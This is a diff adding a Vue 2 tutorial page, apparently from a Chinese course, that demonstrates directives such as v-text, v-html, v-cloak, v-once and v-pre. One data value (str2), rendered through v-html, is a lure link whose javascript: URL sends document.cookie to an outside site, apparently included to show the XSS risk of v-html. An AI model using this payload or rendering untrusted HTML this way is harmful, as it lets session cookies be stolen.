@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8"/>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>vue学习</title>
+    <script src="js/vue.js" type="text/javascript"></script>
+    <script src="js/dayjs.min.js" type="text/javascript"></script>
+    <!-- <script src="js/vue.min.js" type="text/javascript"></script> -->
+</head>
+<body>
+<div id="root">
+    <div>你好，{{name}}  {{str}}</div>
+    <div v-text="name"></div>
+    <div v-text="str"></div>
+
+    <div v-html="str1"></div>
+    <div v-html="str2"></div>
+
+    <br>
+    <br>
+    <br>
+
+    <h2 v-cloak>{{name}}</h2>
+
+
+
+    <br>
+    <br>
+    <br>
+    <h2 v-once>初始化的n值是:{{n}}</h2>
+    <h2 v-pre>Vue其实很简单</h2>
+
+    <h2>当前的n值是:{{n}}</h2>
+    <button @click="n++">点我n+1</button>
+</div>
+
+</body>
+<script type="text/javascript">
+    Vue.config.productionTip = false;
+    new Vue({
+        el: '#root',
+        data: {
+            n: 1,
+            name:'尚硅谷',
+            str:'<h3>你好啊！</h3>',
+            str1:'<h3>你好啊！1111111</h3>',
+            str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
+        },
+    });
+
+</script>
+</html>
